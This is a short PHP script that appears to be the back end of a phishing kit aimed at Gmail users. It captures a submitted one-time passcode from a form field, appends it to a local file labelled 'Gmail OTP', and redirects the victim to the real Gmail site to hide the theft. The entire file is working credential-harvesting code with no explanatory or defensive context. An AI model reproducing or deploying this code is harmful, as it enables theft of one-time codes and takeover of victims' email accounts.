<?php
file_put_contents("otp.txt", "Gmail OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.gmail.com/');
?>
